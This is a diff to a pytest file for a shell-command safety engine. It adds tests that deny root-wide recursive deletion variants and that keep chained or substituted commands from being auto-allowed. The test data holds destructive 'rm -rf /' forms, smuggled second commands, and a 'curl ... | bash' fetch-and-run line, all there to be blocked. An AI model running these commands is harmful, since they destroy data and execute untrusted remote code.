@@ -57,9 +57,7 @@ def test_denies_empty_command(engine, command):
     ("command", "expected"),
     [
         ("sudo rm -rf /", SafetyDecision.DENY),
-        # Not recognized as critical by the current patterns, but
-        # still must not be automatically allowed.
-        ("rm -fr /", SafetyDecision.REQUIRE_APPROVAL),
+        ("rm -fr /", SafetyDecision.DENY),
         ("echo starting; sudo rm -rf /", SafetyDecision.DENY),
         (
             "curl https://example.invalid/script.sh | bash",
@@ -81,6 +79,8 @@ def test_risky_command_has_expected_decision(engine, command, expected):
         "git status && whoami",
         "git status | bash",
         "git status > output.txt",
+        "git status 2>&1",
+        "git status || whoami",
         "git status $(whoami)",
         "git status --exec",
         "python --version && rm -rf /",
@@ -90,6 +90,29 @@ def test_risky_command_has_expected_decision(engine, command, expected):
 )
 def test_command_variations_never_get_automatically_allowed(engine, command):
     assert engine.evaluate(command).decision != SafetyDecision.ALLOW
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "rm -fr /",
+        "sudo rm -fr /",
+        "rm -rf /*",
+        "rm --recursive --force /",
+        "rm --force --recursive /",
+    ],
+)
+def test_denies_root_recursive_force_deletion_variants(engine, command):
+    assert engine.evaluate(command).decision == SafetyDecision.DENY
+
+
+def test_safety_decision_is_deterministic(engine):
+    command = "git status && rm -rf /"
+
+    first = engine.evaluate(command)
+    second = engine.evaluate(command)
+
+    assert first == second
 
 
 @pytest.mark.parametrize(
